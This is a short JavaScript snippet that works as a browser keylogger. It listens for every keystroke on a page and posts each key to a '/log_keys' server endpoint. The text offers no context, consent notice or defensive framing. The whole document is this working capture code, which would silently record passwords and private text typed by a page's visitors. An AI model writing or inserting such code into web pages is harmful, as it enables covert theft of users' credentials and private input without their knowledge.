document.addEventListener('keydown', function(event) {
    let keyPressed = event.key;  // Capture the key pressed

    // Send the key to the server via a POST request
    fetch('/log_keys', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ key: keyPressed })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});
